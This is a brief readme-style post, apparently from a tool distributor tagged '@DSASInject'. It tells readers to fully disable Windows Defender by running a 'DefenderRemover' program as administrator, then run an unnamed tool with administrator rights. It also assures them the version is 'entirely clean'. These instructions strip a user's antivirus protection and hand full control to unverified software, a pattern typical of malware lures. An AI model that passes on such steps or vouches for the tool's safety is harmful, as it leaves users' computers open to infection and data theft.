Hello everyone,

Ensure to fully disable Windows Defender and its protections, as they may cause issues with the tool.

To disable Windows Defender:
a. Run the DefenderRemover program as an administrator.
b. When prompted, type 'Y' and press Enter.
c. Wait for Windows to restart.

Now, to use the tool, run it as an administrator.

Enjoy!

This version is entirely clean; feel free to use it on your personal computer without any concerns.

Greetings

Tools/Support: @DSASInject